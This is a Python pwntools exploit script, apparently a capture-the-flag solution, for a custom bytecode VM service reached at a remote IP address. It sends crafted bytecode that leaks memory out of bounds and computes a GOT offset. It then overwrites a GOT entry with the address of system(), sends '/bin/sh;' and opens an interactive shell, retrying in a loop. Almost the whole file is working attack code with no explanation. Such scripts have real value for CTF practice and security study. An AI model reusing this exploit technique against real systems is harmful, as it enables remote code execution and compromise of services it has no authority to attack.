from pwn import *

#context.log_level = 'debug'

while True:
	try:
		#p = process('./tpu.py')
		p = remote('52.79.129.93', 1337)
		#p = remote('localhost', 1337)
		
		pay = '\x09' # assign
		pay += '\x00' # mode 0 
		pay += '\x00' + '\x00' # e.r[0] = e.a[0]
		
		pay += '\x09' # assign
		pay += '\x00' # mode 0 
		pay += '\x01' + '\x01' # e.r[1] = e.a[1]
		
		pay += '\x01' # add
		pay += '\x00' + '\x01' + '\x02' # e.r[2] = e.r[0] + e.r[1] & 0xFF
		
		pay += '\x0c' # ret
		pay += '\x02' # e.r[2]
		
		#print pay.encode('hex')
		p.sendlineafter(':', pay.encode('hex'))
		
		pay = ''
		
		for i in range(7):
			pay += '\x09' # e.r[0] = e.a[i]
			pay += '\x00'	
			pay += chr(i) + '\x00'
			
			pay += '\x00' # e.r[7] = 32
			pay += chr(32)
			pay += '\x07'
			
			pay += '\x05' # e.r[1] = e.r[0] ^ e.r[7]
			pay += '\x00' + '\x07' + '\x01'
			
			pay += '\x0c' # ret
			pay += '\x01' # e.r[1]
				
		#print pay.encode('hex')
		p.sendlineafter(':', pay.encode('hex'))
		
		pay = '\x00' # e.r[3] = 0
		pay += '\x00' + '\x03'
		
		pay += '\x00' # e.r[4] = 1
		pay += '\x01' + '\x04'
		
		pay += '\x00' # e.r[6] = 33
		pay += chr(33) + '\x06'
		
		pay += '\x00' # e.r[7] = 20
		pay += chr(20) + '\x07'
		
		pay += '\x09' # e.r[0] = e.a[0]
		pay += '\x00'	
		pay += '\x00' + '\x00'
		
		pay += '\x09' # e.r[1] = e.a[1] 
		pay += '\x00'	
		pay += '\x01' + '\x01'
		
		pay += '\x01' # e.r[3] += e.r[0]
		pay += '\x03' + '\x00' + '\x03'
		
		pay += '\x02' # e.r[1] -= 1
		pay += '\x01' + '\x04' + '\x01'
		
		pay += '\x0b' + '\x01' # jmp if e.r[1] == 0
		pay += '\x06'
		
		pay += '\x0a' # jmp loop
		pay += '\x07'
		
		pay += '\x0c' # ret
		pay += '\x03'
		
		#print pay.encode('hex')
		p.sendlineafter(':', pay.encode('hex'))

		# bruteforce zzlol
		pay = '\x00'+'\x69'+'\x00'
		pay += '\x0c' # ret
		pay += '\x00'
		
		#print pay.encode('hex')
		p.sendlineafter(':', pay.encode('hex'))
		
		############ exploit ############

		pay = ''
		pay += '\x0d'
		
		pay += '\x00'
		pay += '\x67' + '\x03'
		
		for i in range(8):
			pay += '\x09'
			pay += '\x04'
			pay += '\x03' + chr(i)

		p.sendlineafter(':', pay.encode('hex'))

		leak = ''
		
		pay = ''
		pay += '\x0d'

		for idx in range(0x50, -1, -1):
			pay += '\x00'
			pay += chr(0x28) + '\x03'
			
			pay += '\x01'
			pay += '\x03' + '\x03' + '\x03'			

			pay += '\x00' # e.r[4] = idx
			pay += chr(idx) + '\x04'
			
			pay += '\x02'
			pay += '\x03' + '\x04' + '\x03'

			pay += '\x06' + '\x03'
			
			pay += '\x09' + '\x03' + '\x03' + '\x00'
			
			pay += '\x0c'
			pay += '\x00'

		#print pay.encode('hex')
		p.sendlineafter(':', pay.encode('hex'))
		p.recvuntil('[')	
		leak = '['+ p.recvuntil(']')
		leak = eval(leak)

		var = ''
		for byte in leak:
			if byte<0:
				byte &= 0xff
			var += chr(byte)
		print hexdump(var)

		array = u64(var[9:9+8], endian='big') - 0x10
		print 'array : ' + hex(array)
	
		#libc = u64(leak[0x10:0x18]) + 0x2ab500
		#prdi = libc + 0x26b72
		sys = 0x4236c0
		#array = libc - 0x456e60
		got = 0x8ed1a8
		off = array - got + 0x10 - 0x30
	
		pay = ''
		pay += '\x0d'
		
		for i in range(8):
			tar = p64(sys)[i]
			for byte in list(p64(off-i, endian='big')):
				pay += '\x00'
				pay += byte + '\x07'
				
				pay += '\x00'	
				pay += '\x08' + '\x06'
				
				pay += '\x01'
				pay += '\x07' + '\x00' + '\x00'
				
				pay += '\x08' 
				pay += '\x00' + '\x06' + '\x00'
			
			pay += '\x07' # shr
			pay += '\x00' + '\x06' + '\x00' 
			
			pay += '\x06' + '\x00' # negative offset
			pay += '\x00' + tar + '\x01'
			pay += '\x09' + '\x05' + '\x01' + '\x00'

		
		p.sendlineafter(':', pay.encode('hex'))
		p.sendlineafter(':', '/bin/sh;')

		#p.sendline('x'*0x83+p64(prdi)+p64(libc+0x1b75aa)+p64(libc+0x5543c)+p64(libc+0x55410))
		
		p.interactive()

	except:
		p.close()
